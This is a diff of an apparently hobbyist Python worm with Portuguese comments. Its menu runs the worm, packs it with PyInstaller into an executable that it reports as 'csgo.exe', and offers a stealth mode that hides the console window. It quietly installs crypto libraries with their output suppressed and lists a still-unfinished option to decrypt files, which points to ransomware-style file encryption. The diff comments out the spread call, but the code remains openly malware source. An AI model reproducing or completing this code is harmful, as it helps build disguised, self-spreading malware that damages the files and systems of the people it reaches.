@@ -1,5 +1,5 @@
 import os
-os.system("pip install pypiwin32 pyinstaller pycryptodome > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
+os.system("pip install pypiwin32 pyinstaller pycryptodome cryptography > /dev/null 2>&1") # /dev/null 2>&1 -> esconder o output
 import sys
 import time
 import threading
@@ -80,7 +80,7 @@ class Worm:
             self.find_directories()
 
         # print(self.target_dir_list)
-        self.spread()
+        # self.spread()
 
 def banner_func():
     print("""
@@ -101,7 +101,6 @@ def worm_menu():
     print(' --------------------------------- ')
 
 if __name__ == "__main__":
-    print("here")
     system("cls")
 
     banner_func()
@@ -117,25 +116,24 @@ if __name__ == "__main__":
         match opt:
             case 1: # modo normal
                 print("[!] Running Worm!")
-                print('[!] Press [Ctrl] + [C] to Stop!')
                 worm.execute_worm()
             case 2: # criação de executável
                 print("[+] Creating EXE of Worm!")
-                print('[!] Press [Ctrl] + [C] to Stop!')
                 time.sleep(1)
 
-                os.system("pyinstaller resistencia-exe.py --onefile --noconsole --name resistencia")
+                os.system("pyinstaller resistencia-exe.py --onefile --name resistencia")
                 print("[!] csgo.exe Created")
             case 3: # modo furtivo
                 hide = win32gui.GetForegroundWindow()
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
                 worm.execute_worm()
+                sys.exit(0)
             case 4: # desencriptar ficheiros
                 print("doesn't work :( (yet)")
                 pass
             case 0:
                 print("[!] Quitting...")
-                time.sleep(1.5)
+                time.sleep(0.5)
                 break
             case _:
                 print("[!] Invalid Option.")
